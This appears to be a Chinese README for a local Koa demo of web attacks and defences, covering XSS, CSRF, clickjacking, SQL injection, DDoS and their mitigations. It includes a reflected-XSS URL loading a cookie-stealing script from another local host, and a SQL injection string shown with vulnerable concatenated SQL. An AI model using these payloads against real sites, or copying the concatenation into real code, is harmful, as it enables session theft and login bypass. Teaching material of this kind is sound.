# xss-cookie
### 安装数据库
首先需要安装数据库，具体见https://mp.csdn.net/postedit/104061730
有我的安装和数据添加过程。

### 克隆我的git

#### 安装依赖

cnpm i

nodemon index.js

打开浏览器输入 http://localhost:3000/

先用你自己设置的数据登陆。
以我的为例：用户名：liuwei
           密码：  111111
 
 
 页面中的信息中的china来自地址栏：http://localhost:3000/?from=china
 
 ## 反射性攻击

 
 你可以输入
http://localhost:3000/?from=<script>alert(3)</script>

会发现有弹窗。

再次输入http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"></script>

就可以获取到你的document.cookie值了。

有时候会通过短地址的形式伪装url。

## 存储型攻击，将代码存储到数据库
比如评论
## 怎么防范


<%= code %>会对code进行html转义，就是原样输出；
<%- code %>执行js代码；

还有一种理论上的办法。。。。我尝试过没有效果。。。不知道为什么。。。
### 启动浏览器xss过滤；
ctx.set('X-XSS-Protection', 1)和ctx.set('X-XSS-Protection', 0) 
ctx.set('X-XSS-Protection', 1)理论上这个值是浏览器默认的值，会过滤掉html中的xss攻击；

### 内容安全策略 (CSP, Content Security Policy) 
告诉浏览器哪些外部资源可以加载和执行。

比如:

// 只允许加载本站资源
Content-Security-Policy: default-src 'self'

// 只允许加载 HTTPS 协议图片
Content-Security-Policy: img-src https://*

// 不允许加载任何来源框架
Content-Security-Policy: child-src 'none

### 对用户输入内容进行转义，比如<,>,等等

### 黑名单

将<script/> onerror 这种危险标签或者属性纳入黑名单。过滤掉

### 白名单

const xss = require('xss')
let html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss");</script>')
// -> <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;
console.log(html)

引入xss模块，将富文本等某些确定无害的内容，保留格式；

### HttpOnly 


这是预防XSS攻击窃取用户cookie最有效的防御手段。Web应 用程序在设置cookie时，将其属性设为
HttpOnly，就可以避免该网页的cookie被客户端恶意JavaScript窃取，保护用户cookie信息。



## CSRF
CSRF(Cross Site Request Forgery)，即跨站请求伪造，是一种常见的Web攻击，它利用用户已登录的身份，
在用户毫不知情的情况下，以用户的名义完成非法操作。

用户已经登录了站点 A，并在本地记录了 cookie
在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B

### 危害

利用用户登录态
用户不知情
完成业务请求
盗取用户资金（转账，消费）
冒充用户发帖背锅
损害网站声誉

### 防御

#### 验证码
需要输入验证码；


#### 验证网站b

app.use(async (ctx, next) => {
await next()
const referer = ctx.request.header.referer
console.log('Referer:', referer)
})

但是有缺陷：如果 HTTPS 网址链接到 HTTP 网址，不发送Referer字段，

也可以修改浏览器的默认设置，不发送referer；

### 禁止第三方带cookie

禁止第三方网站带 Cookies,即在响应头 Set-Cookie 设置SameSite 属性，strict或者Lax，前者一律不允许，后者不是同源，且发送post请求会被阻止；



## 点击劫持

使用iframe嵌入网页中，诱导用户点击，

###防御

X-FRAME-OPTIONS

X-FRAME-OPTIONS 是一个 HTTP 响应头，在现代浏览器有一个很好的支持。这个 HTTP 响应头 就是为了防御
用 iframe 嵌套的点击劫持攻击。
该响应头有三个值可选，分别是
DENY，表示页面不允许通过 iframe 的方式展示
SAMEORIGIN，表示页面可以在相同域名下通过 iframe 的方式展示
ALLOW-FROM，表示页面可以在指定来源的 iframe 中展示


## SQL注入
通过修改判断，让后端验证数据通过


// 填入特殊密码
1'or'1'='1
// 拼接后的SQL
SELECT *
FROM test.user
WHERE username = 'laowang'
AND password = '1'or'1'='1'

### 例子：

// 错误写法
const sql = `
SELECT *
FROM test.user
WHERE username = '${ctx.request.body.username}'
AND password = '${ctx.request.body.password}'
`
console.log('sql', sql)
res = await query(sql)
// 正确的写法
const sql = `
SELECT *
FROM test.user
WHERE username = ?
AND password = ?
`
console.log('sql', sql, )
res = await query(sql,[ctx.request.body.username, ctx.request.body.password])


### 措施：

不要直接拼接 SQL 语句

对进入数据库的特殊字符（'，"，\，<，>，&，*，; 等）进行转义处理

严格限制Web应用的数据库的操作权限，

后端代码检查输入的数据是否符合预期

## OS命令注入

OS命令注入和SQL注入差不多，只不过SQL注入是针对数据库的，而OS命令注入是针对操作系统的。OS命令注入攻击指
通过Web应用，执行非法的操作系统命令达到攻击的目的。只要在能调用Shell函数的地方就有存在被攻击的风险

## 请求劫持
### DNS劫持
顾名思义，DNS服务器(DNS解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不是预期的ip

HTTP劫持 运营商劫持，此时大概只能升级HTTPS了
### DDOS


### SYN Flood
此攻击通过向目标发送具有欺骗性源IP地址的大量TCP“初始连接请求”SYN数据包来利用TCP握手。目标机器
响应每个连接请求，然后等待握手中的最后一步，这一步从未发生过，耗尽了进程中的目标资源。
### HTTP Flood
此攻击类似于同时在多个不同计算机上反复按Web浏览器中的刷新 - 大量HTTP请求泛滥服务器，导致拒绝服
务。
### 防御手段
- 备份网站
备份网站不一定是全功能的，如果能做到全静态浏览，就能满足需求。最低限度应该可以显示公告，告诉用户，网
站出了问题，正在全力抢修。

- HTTP 请求的拦截 高防IP -靠谱的运营商 多个 Docker
硬件 服务器 防火墙

互联网服务器，在遭受大流量的DDoS攻击后导致服务不可用的情况下，通过配置高防IP，将攻击流量引流到高防IP，确保源站的稳定可靠。”

- 带宽扩容 + CDN
提高犯罪成本

